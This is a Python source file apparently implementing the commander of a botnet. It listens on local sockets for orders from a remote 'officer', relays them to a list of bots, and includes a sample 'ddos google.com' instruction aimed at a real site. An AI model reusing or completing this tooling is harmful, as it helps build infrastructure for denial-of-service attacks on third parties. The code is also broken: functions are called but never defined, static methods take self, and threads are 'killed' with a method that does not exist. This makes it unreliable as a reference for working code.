import socket
import argparse
import threading
import utils
from random import randint
from cryptography.fernet import Fernet
from datetime import datetime

icon = """\
█▀█ █▀█ ▀▀▀█ 
░▄▀ ░▄▀ ░░█░ 
█▄▄ █▄▄ ░▐▌░
"""

parser = argparse.ArgumentParser(prog='Commander.py')

parser.add_argument('-s', '--server')
parser.add_argument('-b', '--bots', nargs='*')

args = parser.parse_args()
instruction = ''

def keys_fetcher():
    while True:
        if datetime.now().strftime('%H%M%S') == '000000':
            pass

keys_fetcher_thread = threading.Thread(target=keys_fetcher)


class Commander:
    def __init__(self):
        self.instruction_socket = None
        self.soldiers = args.bots
        self.server_ip = args.server
        receiver = threading.Thread(target=self.get_orders)
        receiver.start()

        error_thread = threading.Thread(target=self.listen_errors)
        error_thread.start()

        client_connection = threading.Thread(target=self.clients_connection)
        client_connection.start()

    @staticmethod
    def clients_connection(self):
        active_connections: list = [0]
        while True:
            while active_connections[0] <= len(args.bots):
                manager_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                manager_socket.bind(('localhost', 12008))
                manager_socket.listen()

                client_addr, client_socket = None, None

                while client_addr is None and client_socket is None:
                    client_socket, client_addr = manager_socket.accept()

                client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client.connect((client_addr, 12009))

                active_connections[0] += 1
                active_connections.append((client_socket, client_addr))

    @staticmethod
    def listen_errors(self):
        # Function to deal with bots errors
        while True:
            receiving_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            receiving_socket.bind(('localhost', 12012))
            receiving_socket.listen()
            distant_socket, distant_addr = receiving_socket.accept()
            print(distant_socket.recv(8192).decode())

            for thread in threading.enumerate():
                thread.kill()

    def get_orders(self):
        self.instruction_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.instruction_socket.bind(('localhost', 12006))
        self.instruction_socket.listen()

        client_socket, client_address = self.instruction_socket.accept()
        global instruction

        instruction_level = 0

        while True:
            instruction = client_socket.recv(8192).decode()
            if instruction == 'kill':
                raise KilledByOfficer
            print(instruction)
            self.send_instructions(create_header('command', socket.gethostname(), instruction_level), instruction)


class KilledByOfficer(Exception):
    """Raised when connection is killed by distant officer"""

    def __init__(self, bot_commander: Commander):
        for bot in args.bots:
            header = utils.socket_packets.generate_header(5, 2)
            kill_message = utils.socket_packets.generate_packets(header[0], "kill", header[1])


# commander = Commander()
print((create_header("command", "127.0.0.1", "info"), "ddos google.com"))
print(create_header("command", "127.0.0.1", 5))
